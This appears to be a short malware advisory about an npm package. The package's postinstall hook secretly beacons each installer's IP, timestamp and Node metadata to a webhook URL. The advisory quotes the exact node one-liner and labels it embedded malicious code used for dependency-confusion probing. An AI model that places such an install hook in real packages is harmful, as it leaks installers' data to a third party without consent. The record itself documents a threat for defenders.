summary: postinstall beacon to webhook.site canary on every install
details: package.json declares a postinstall lifecycle hook that runs `node -e "require('https').get('https://webhooksite.net/206fe563-3cfb-42fc-b589-b8b748b4c640')"` on every `npm install`. The package's advertised functionality is a trivial greet() helper with no need for network I/O. The unconditional HTTPS GET to a webhook.site request-bin URL discloses the installer's public IP, install timestamp, and Node/User-Agent metadata to a third-party canary owned by whoever controls that webhook.site token. This is the standard reconnaissance shape for dependency-confusion and namesquat probing — the package's purpose on install is to report back that an installer was reached, providing the publisher with intelligence about which environments resolved this name.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
